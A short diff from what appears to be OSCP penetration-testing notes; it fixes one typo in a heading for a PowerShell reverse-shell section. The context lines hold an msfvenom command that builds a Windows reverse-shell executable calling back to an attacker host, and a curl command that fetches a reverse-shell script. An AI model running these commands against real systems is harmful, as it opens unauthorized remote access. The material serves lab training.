@@ -45,7 +45,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /va
 
 ### PowerShell-based reverse shell script:
 
-Download the reverse shell scription:
+Download the reverse shell script:
 
 ```console
 curl -O https://raw.githubusercontent.com/joetanx/oscp/main/reverse.ps1
